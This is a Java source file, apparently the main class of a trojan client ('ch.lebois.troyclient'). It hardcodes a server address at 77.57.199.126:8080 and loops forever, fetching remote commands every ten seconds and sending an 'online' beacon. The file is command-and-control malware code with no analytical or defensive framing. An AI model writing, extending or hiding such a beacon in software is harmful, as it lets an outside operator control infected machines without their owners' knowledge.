package ch.lebois.troyclient;

import ch.lebois.troyclient.main.CommandReciver;
import ch.lebois.troyclient.main.ConfigureInit;
import ch.lebois.troyclient.main.GetContext;

public class TroyClient {
    public static void main(String[] args) throws InterruptedException {

        ConfigureInit init = new ConfigureInit();
        init.configure("http://77.57.199.126:8080");

        CommandReciver commandReciver = new CommandReciver(init.getWebHandler());
        while (true) {
            Thread.sleep(10000);
            commandReciver.readCommands();
            GetContext.SENDER.send("online", "");
        }
    }
}
